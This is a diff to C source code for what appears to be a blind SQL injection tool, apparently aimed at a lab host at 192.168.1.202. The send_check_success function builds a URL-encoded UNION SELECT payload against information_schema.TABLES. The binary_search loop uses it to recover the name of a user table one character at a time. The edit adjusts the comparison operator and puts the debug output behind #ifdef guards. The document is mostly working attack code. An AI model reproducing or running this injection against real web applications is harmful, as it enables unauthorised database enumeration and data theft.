@@ -206,12 +206,15 @@ bool recv_empty(int32_t sockfd) {
 
 bool send_check_success(char * discovered_name, int i, char mid, int sockfd) {
     char mal_req[2048];
-    sprintf(mal_req, "GET /index.php?order_id=0%%20UNION%%20SELECT%%20table_name%%20FROM%%20information_schema.TABLES%%20WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20AND%%20table_name%%20LIKE%%20%%27%s%%25%%27%%20AND%%20SUBSTR(table_name,%i,1)<=%%27%c%%27%%20LIMIT%%201; HTTP/1.1\r\n"
+    sprintf(mal_req, "GET /index.php?order_id=0%%20UNION%%20SELECT%%20table_name%%20FROM%%20information_schema.TABLES%%20WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20AND%%20table_name%%20LIKE%%20%%27%s%%25%%27%%20AND%%20SUBSTR(table_name,%i,1)<%%27%c%%27%%20LIMIT%%201; HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
         "Connection: Keep-Alive\r\n"
         "\r\n",
         discovered_name, i, mid
     );
+#ifdef __MY_DEBUG__
+    puts(mal_req);
+#endif
     _send(sockfd, mal_req, strlen(mal_req));
 
     return recv_empty(sockfd);
@@ -224,7 +227,9 @@ void binary_search(char * discovered_name, int sockfd) {
 #endif
     char mid;
     for (int i = 0; i < 10; i++) {
+    #ifdef __MY_DEBUG__
         printf("%i--\n", i);
+    #endif
         char low = 'a';
         char high = 'z';
         while (low < high) {
@@ -238,7 +243,9 @@ void binary_search(char * discovered_name, int sockfd) {
             else {
                 high=mid-1;
             }
+        #ifdef __MY_DEBUG__
             printf("\t%s,%c,%c\n", discovered_name, low, high);
+        #endif
         }
         discovered_name[i] = low;
     }
